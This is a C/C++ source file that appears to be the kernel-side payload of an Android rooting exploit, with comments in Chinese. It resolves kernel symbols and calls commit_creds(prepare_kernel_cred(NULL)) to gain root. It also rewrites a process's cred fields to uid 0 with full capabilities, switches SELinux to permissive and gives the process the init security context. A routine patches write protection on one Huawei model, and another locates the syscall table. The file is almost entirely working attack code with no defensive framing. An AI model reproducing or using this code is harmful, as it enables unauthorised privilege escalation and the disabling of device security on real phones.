#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>
#include "sidtab.h"
#include "sid.h"
#include "policydb.h"
#include "threadinfo.h"
#include "log.h"
#include "getroot.h"

#include "KnownsAddressManager.h"
#include "ReportManager.h"

extern "C" unsigned long lookup_sym(const char *name);

int (*my_printk)(const char *fmt, ...) = NULL;
void (*my_selnl_notify_setenforce)(int val) = NULL;
void (*my_selinux_status_update_setenforce)(int enforcing) = NULL;
int (*my_security_context_to_sid)(const char *scontext, unsigned scontext_len, unsigned *sid) = NULL;

int *selinux_enforce = NULL;
int *selinux_enabled = NULL;
unsigned int init_sid = 0;

struct task_struct;
struct cred;
extern int socket_fd_exploit;
extern unsigned long cred_addr;

extern "C" {
    int root_by_commit_cred();
    int modify_cred_security_uc(struct cred *cred, int sid);
};

struct cred *(*my_prepare_kernel_cred)(struct task_struct *daemon) = NULL;
int (*my_commit_creds)(struct cred *) = NULL;

struct cred *(*my_get_task_cred) (struct task_struct *task) = NULL;

inline unsigned long get_address(const char *name)
{
        KnownsAddressManager *pKAManager = KnownsAddressManager::instance();
        unsigned long ret = 0;

        ret = (unsigned long)pKAManager->getAddress(name);
        if (ret == 0) {
                ret = (unsigned long)lookup_sym(name);
        }

        if (ret) {
                TRACE("找到符号 %s, 地址: 0x%08x\n", name, ret);
        }
        else {
                TRACE("未找到符号 %s \n", name);
        }
        return ret;
}

void prepare_syms_for_selinux()
{
        ReportManager *pRManager = ReportManager::instance();

        my_printk = (int (*) (const char *, ...))get_address("printk");

        selinux_enforce = (int*)get_address("selinux_enforcing");
        selinux_enabled = (int*)get_address("selinux_enabled");


        my_selnl_notify_setenforce = (void (*)(int))get_address("selnl_notify_setenforce");

        my_selinux_status_update_setenforce = (void (*)(int))get_address("selinux_status_update_setenforce");

        if (selinux_enforce && my_selnl_notify_setenforce
            && my_selinux_status_update_setenforce) {
                TRACE("关闭selinux所需的符号到位. \n");
                pRManager->setAddress((char*)"selinux_enforcing", (uint32_t)selinux_enforce);
                pRManager->setAddress((char*)"selnl_notify_setenforce", (uint32_t)my_selnl_notify_setenforce);
                pRManager->setAddress((char*)"selinux_status_update_setenforce", (uint32_t)my_selinux_status_update_setenforce);
        }

        my_security_context_to_sid = (int (*) (const char *, unsigned, unsigned*))get_address("security_context_to_sid");

        if (my_security_context_to_sid) {
                TRACE("上下文转换sid符号到位. \n");
                pRManager->setAddress((char*)"security_context_to_sid", (uint32_t)my_security_context_to_sid);
        }

        policydb = (struct policydb *)get_address("policydb");
        sidtab = (struct sidtab *)get_address("sidtab");

        if (policydb && sidtab) {
                TRACE("selinux策略解析相关的符号到位. \n");
                pRManager->setAddress((char*)"policydb", (uint32_t)policydb);
                pRManager->setAddress((char*)"sidtab", (uint32_t)sidtab);
        }
}

void prepare_syms_for_set_cred()
{
        ReportManager *pRManager = ReportManager::instance();

        my_get_task_cred = (struct cred * (*) (struct task_struct*))get_address("get_task_cred");
        if (my_get_task_cred) {
                TRACE("获取cred的符号到位. \n");
                pRManager->setAddress((char*)"get_task_cred", (uint32_t)my_get_task_cred);
        }
}

int shutdown_selinux()
{
        struct cred *cred;
        unsigned sid;

        if (! selinux_enforce)
                return 3;

        if (my_selnl_notify_setenforce && my_selinux_status_update_setenforce) {
                my_printk("shutdown selinux_enforcing!\n");
                my_selnl_notify_setenforce(0);
                my_selinux_status_update_setenforce(0);
        }


        if (my_security_context_to_sid) {
                my_printk("find context_to_sid\n");
                my_security_context_to_sid("u:r:init:s0", 12, &sid);
                if (sid) {
                        my_printk("security_context_to_sid: init sid = %d\n", sid);
                        cred = (struct cred*)cred_addr;
                        cred->security->osid = cred->security->sid = sid;
                }
        }

        return 0;
}


void prepare_syms_for_commit_cred()
{
        ReportManager *pRManager = ReportManager::instance();

        my_printk = (int (*) (const char *, ...))get_address("printk");
        my_prepare_kernel_cred = (struct cred* (*) (struct task_struct*))get_address("prepare_kernel_cred");
        my_commit_creds = (int (*) (struct cred*))get_address("commit_creds");

        if (my_printk && my_prepare_kernel_cred && my_commit_creds) {
                TRACE("commit_cred所需的符号到位. \n");
                pRManager->setAddress((char*)"prepare_kernel_cred", (uint32_t)my_prepare_kernel_cred);
                pRManager->setAddress((char*)"commit_creds", (uint32_t)my_commit_creds);
        }
}

int root_by_commit_cred()
{
        //prepare_syms_for_commit_cred();
        //prepare_syms_for_selinux();

        int ret;

        struct cred* root_cred;

        if (my_printk) {
                my_printk("called in kernel!\n");
        }

        if (my_prepare_kernel_cred && my_commit_creds) {
            root_cred = my_prepare_kernel_cred(NULL);
            if (root_cred != NULL)  {

                my_commit_creds(root_cred);
                ret = shutdown_selinux();

            } else {
                ret = 1;
            }
        } else {
            ret = 2;
        }

        return ret;
}

/* for HUAWEI X5 */
int mod_wp()
{
        unsigned long *p;
        unsigned long *end;
        unsigned long tmp;
        unsigned long *t;

        p = (unsigned long*)get_address("submit_bio");
        if (!p) {
                my_printk("can not find symbol addr!\n");
                return 0;
        }

        end = p + (0x400 / sizeof(unsigned long*));
        while(p < end) {

                if ((*p & ~0xfff) == 0xe59f1000) {
                        if ((*(p + 1) & 0xff000000) == 0xeb000000) {
                                tmp = *p << 20;
                                t = (unsigned long *)((tmp >> 20) + (unsigned long)p);
                                t = (unsigned long *)*(t + 2);
                                if (*t == 0x41414141) {
                                        return 2;
                                }
                                else if (*t == 0x62636d6d) {
                                        *t = 0x41414141;
                                        return 1;
                                }
                        }
                }
                p++;
        }
        return 0;
}

int test()
{
        my_printk = (int (*)(const char *, ...))get_address("printk");
        if (my_printk) {
                my_printk("invoke OK!\n");
                //return 123;
        }
        return 0;
}

int root_by_set_cred(void)
{
        unsigned long *taskbuf;
        struct task_struct_partial *task;
        struct cred *cred = NULL;
        struct task_security_struct *security;
        struct thread_info *thread;
        int i;

        thread = current_thread_info();

        if (my_get_task_cred) {
                cred = my_get_task_cred(thread->task);
        }

        if (cred == NULL) {
                taskbuf = (unsigned long *)thread->task;
                for (i = 0; i < 0x100; i++) {
                        task = (struct task_struct_partial *)(taskbuf + i);
                        if (task->cpu_timers[0].next == task->cpu_timers[0].prev
                            && (unsigned long)task->cpu_timers[0].next > KERNEL_START
                            && task->cpu_timers[1].next == task->cpu_timers[1].prev
                            && (unsigned long)task->cpu_timers[1].next > KERNEL_START
                            && task->cpu_timers[2].next == task->cpu_timers[2].prev
                            && (unsigned long)task->cpu_timers[2].next > KERNEL_START
                            && task->real_cred == task->cred) {
                                cred = task->cred;
                                break;
                        }
                }
        }

        if (cred == NULL) {
                return 1;
        }

        security = cred->security;
        if ((unsigned long)security > KERNEL_START
            && (unsigned long)security < 0xffff0000) {
                if (security->osid != 0
                    && security->sid != 0
                    && security->exec_sid == 0
                    && security->create_sid == 0
                    && security->keycreate_sid == 0
                    && security->sockcreate_sid == 0) {

                        if (init_sid) {
                                security->osid = init_sid;
                                security->sid = init_sid;
                        }
                        else {
                                security->osid = 1;
                                security->sid = 1;
                        }
                }
        }

        cred->uid = 0;
        cred->gid = 0;
        cred->suid = 0;
        cred->sgid = 0;
        cred->euid = 0;
        cred->egid = 0;
        cred->fsuid = 0;
        cred->fsgid = 0;

        cred->cap_inheritable.cap[0] = 0xffffffff;
        cred->cap_inheritable.cap[1] = 0xffffffff;
        cred->cap_permitted.cap[0] = 0xffffffff;
        cred->cap_permitted.cap[1] = 0xffffffff;
        cred->cap_effective.cap[0] = 0xffffffff;
        cred->cap_effective.cap[1] = 0xffffffff;
        cred->cap_bset.cap[0] = 0xffffffff;
        cred->cap_bset.cap[1] = 0xffffffff;

        shutdown_selinux();
        return 0;
}

unsigned long find_syscall_table()
{
        int ret;
        unsigned long addr;

        addr = 0xffff0008 + 8 + (*(unsigned long*)0xffff0008 & 0xfff);
        addr = *(unsigned long*)addr;

        //ret = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
        ret = prctl(21, 0, 0, 0, 0);
        if (ret > 0)
                addr += 0x18;
        /* ret = syscall(__NR_semop, , 0, 0); */
        /* printf("ret = %d\n", ret); */
        /* if (ret == -1) */
        /*         perror("semop:"); */

        /* vector_swi +  __sys_trace  + __sys_trace_return  */
        addr += 0x74 + 0x2c + 0x18;
        addr = (addr + (1 << 5) - 1) & ~0x1f;  /* align 5: __cr_alignment */
        addr += 0x4;            /* + _cr_alignment */

        return addr;
}
